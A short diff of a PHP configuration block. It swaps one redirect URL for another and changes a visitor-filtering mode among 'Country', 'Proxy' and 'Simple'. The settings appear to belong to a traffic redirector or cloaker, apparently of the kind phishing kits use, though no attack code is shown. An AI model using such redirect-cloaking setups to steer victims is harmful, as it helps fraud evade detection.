@@ -57,9 +57,9 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://b45e9741a0.au2.amezmo.co/hiring";
+$redirect = "https://1fec3de2f4.lb3.amezmo.co/port";
 
-$parameter = 2; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
+$parameter = 4; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
 $checkfileup = false; // Check Link UP
 
